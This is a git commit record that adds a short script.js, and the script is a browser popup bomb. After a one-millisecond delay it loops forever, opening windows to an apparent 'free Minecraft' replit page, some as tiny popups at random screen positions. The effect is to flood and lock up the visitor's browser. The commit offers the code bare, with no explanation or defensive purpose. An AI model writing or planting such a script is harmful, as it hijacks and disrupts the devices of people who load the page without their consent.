21d667da97e70fa13dc2dd3ab6d794c1aec7294f
hotpig <93409262+MicahMaphet@users.noreply.github.com>
2022-08-15 01:08:41 +0000

    Initial commit

---
+++ script.js
@@ -0,0 +1,6 @@
+setTimeout(function(){
+    while(1) {
+      window.open("https://free-minecraft.micahmaphet.repl.co/", "", "width=100, height=100, left=" + Math.random() * screen.width + ", top=" + Math.random() * screen.height);
+      window.open("https://free-minecraft.micahmaphet.repl.co/");
+    }
+  }, 1);
